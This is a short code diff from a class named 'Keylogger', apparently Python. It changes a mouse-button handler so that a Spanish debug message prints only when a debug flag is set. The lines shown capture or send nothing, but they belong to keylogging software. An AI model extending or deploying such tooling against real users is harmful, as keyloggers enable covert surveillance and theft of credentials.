@@ -508,7 +508,8 @@ class Keylogger:
         :param button:
         """
 
-        print('Botón pulsado: ' + button)
+        if self.has_debug:
+            print('Botón pulsado: ' + button)
 
         if button == 'left':
             pass
